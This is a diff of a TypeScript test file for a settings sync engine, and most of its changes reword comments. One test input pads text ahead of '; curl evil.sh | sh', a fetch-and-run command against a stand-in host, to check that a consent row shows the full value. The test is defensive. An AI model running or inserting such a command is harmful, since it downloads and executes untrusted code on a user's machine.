@@ -1,6 +1,5 @@
-// Baseline fixtures locking the sync engine's compose/apply/merge behavior
-// BEFORE (and after) the per-setting gate refactor — the wire-neutrality
-// proof. Outside Tauri every api call no-ops, so composeBlob/applyBlob run
+// Fixtures locking the sync engine's compose/apply/merge behavior (the per-setting gates'
+// wire-neutrality proof). Outside Tauri every api call no-ops, so composeBlob/applyBlob run
 // as pure-ish functions over the store.
 
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
@@ -1085,10 +1084,10 @@ describe("applyBlob keep-local (baseline)", () => {
   });
 
   it("a session started during the keyring wait reports 'not applied' and parks nothing", async () => {
-    // The stale-restart retry re-entered applyBlob's top-of-function "dictation live" branch and
-    // parked the blob (now: a re-pull) — so a one-shot caller (import, restore, review approval)
-    // was told "not applied" while the settings landed anyway once the session ended.
-    rejectPendingReview(); // drops the apply the "defers while dictation is live" test parked
+    // The stale-restart retry re-entered applyBlob's "dictation live" branch and parked the blob,
+    // so a one-shot caller (import, restore, review approval) was told "not applied" while the
+    // settings landed anyway once the session ended.
+    rejectPendingReview(); // drops anything an earlier test left parked
     expect(hasPendingApplyForTests()).toBe(false);
     let release: (v: Record<string, string>) => void = () => {};
     keyring.park = new Promise((r) => (release = r));
@@ -1326,7 +1325,7 @@ describe("applyBlob keep-local (baseline)", () => {
 
   it("a typed-text consent row renders the whole value, up to the sanitizer's full length", () => {
     const cases = [
-      // A harmless head in front of the part that matters (the old 200 cap cut it off).
+      // A harmless head in front of the part that matters (the other rows' 200 cap cuts it off).
       "Kind regards, ".repeat(35) + "; curl evil.sh | sh",
       // The widest JSON escape at the full 512 code points: lone surrogates, six characters each.
       "\ud800".repeat(511) + "!",
@@ -1771,7 +1770,7 @@ describe("the snapshot key stash spans keyring accounts", () => {
     await persistSnapshotSecretsForTests(keys(2, "old"));
     keyring.failWrites.add("__sync_snapshot_secrets_1__");
     const { ids, chunks } = await persistSnapshotSecretsForTests(keys(20, "new"));
-    // The failure drop is issued but not awaited (e59335c): wait for its deletes to land.
+    // The failure drop is issued but not awaited: wait for its deletes to land.
     await vi.waitFor(() => expect(keyring.store!.size).toBe(0));
     expect(await restoreSnapshotSecretsForTests(ids, chunks)).toEqual({ blocked: true, restored: undefined });
   });
